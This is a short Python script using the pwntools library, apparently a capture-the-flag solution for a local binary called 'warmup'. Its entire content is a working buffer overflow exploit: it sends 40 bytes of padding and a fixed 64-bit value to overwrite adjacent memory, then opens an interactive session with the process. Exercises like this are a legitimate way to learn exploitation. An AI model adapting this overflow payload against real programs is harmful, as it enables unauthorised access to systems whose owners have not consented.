#!/usr/bin/env python3

from pwn import *

TARGET = './warmup'

p = process(TARGET)

payload = b'A' * 40 + p64(0x6769676967696769)
p.sendlineafter(b'>> ', payload)


p.interactive()

